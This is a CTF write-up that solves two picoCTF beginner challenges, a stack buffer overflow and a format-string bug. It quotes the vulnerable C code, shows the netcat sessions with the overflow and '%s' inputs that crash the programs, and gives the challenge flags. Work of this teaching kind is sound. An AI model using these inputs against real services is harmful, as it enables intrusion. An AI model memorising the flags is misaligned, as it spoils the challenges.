# 1. buffer overflow 0

> Let's start off simple, can you overflow the correct buffer? The program is available [here](resources/binary-exploitation/bufferoverflow0/vuln). You can view source [here](resources/binary-exploitation/bufferoverflow0/vuln.c).  
Connect using: nc saturn.picoctf.net 56279

## Solution:

When we establish the netcat connection, we can see the program asking for an input, and then exiting.

```sh
┌──(soumil㉿Predator)-[~/picoCTF/bufferoverflow0]
└─$ nc saturn.picoctf.net 56279
Input: soumil
The program will exit now
```

Looking at the [source code](resources/binary-exploitation/bufferoverflow0/vuln.c) we can see that the `sigsegv_handler` function will return us the flag, so to setup a segmentation violation we will need to overflow a buffer somewhere, which we can see in the `vuln` function where `buf2` has size of 16.

```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```

Thus we can get the flag.

```sh
┌──(soumil㉿Predator)-[~/picoCTF/bufferoverflow0]
└─$ nc saturn.picoctf.net 56279
Input: 0000000000000000000000000000000
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

## Concepts learnt:

- A SIGSEGV handler is a specific function or routine within a program designed to intercept and manage the SIGSEGV signal. SIGSEGV, or "Segmentation Violation," is a signal sent by the operating system to a process when it attempts to access memory that it is not authorized to access. This typically occurs due to errors like dereferencing a null pointer, accessing out-of-bounds array elements, or attempting to write to read-only memory.

## Notes:

- If you try to do the math by hand, maybe try and add a few more characters, as on inputting 17 characters the buffer didnt overflow. Sometimes there are things you aren't expecting.

***

# 2. format string 0

> Can you use your knowledge of format strings to make the customers happy?
Download the binary [here](resources/binary-exploitation/formatstring0/format-string-0).  
Download the source [here](resources/binary-exploitation/formatstring0/format-string-0.c).  
Connect with the challenge instance here:  
nc mimas.picoctf.net 53409

## Solution:

After establishing connection,

```
┌──(soumil㉿Predator)-[~/picoCTF/bufferoverflow0]
└─$ nc mimas.picoctf.net 53409
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation:
```

After going through the choices, if we enter `Breakf@st_Burger`, we get

```
Breakf@st_BurgerPatrick is still hungry!
Try to serve him something of larger size!
```

Then if we try with `Gr%114d_Cheese`, we get

```
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation:
```

Similary if we choose `Pe%to_Portobello`, we get

```
Enter your recommendation: Pe%to_Portobello
Pe20021560_Portobello
```

Then if we choose `Cla%sic_Che%s%steak` we get

```
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```

By looking at the [source code](resources/binary-exploitation/formatstring0/format-string-0.c), we need to get the flag through the `sigsegv_handler` function, ie: we need to overflow `BUFSIZE` of size 32.

On choosing `Gr%114d_Cheese`, the `%` is actually acting as a format specifier, thats why its being printed like `Gr                                                                                                           4202954_Cheese`, and thus goes to the `serve_bob` function, where the choice `Cla%sic_Che%s%steak` has format specifiers `%s` which are repeating the same string as shown in the output `ClaCla%sic_Che%s%steakic_Che(null)`, since it overflows the buffer of size 32, the `sigsegv_handler` is invoked and we get the flag

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```

## Concepts learnt:

- A SIGSEGV handler is a specific function or routine within a program designed to intercept and manage the SIGSEGV signal. SIGSEGV, or "Segmentation Violation," is a signal sent by the operating system to a process when it attempts to access memory that it is not authorized to access. This typically occurs due to errors like dereferencing a null pointer, accessing out-of-bounds array elements, or attempting to write to read-only memory.
- format specifiers

***
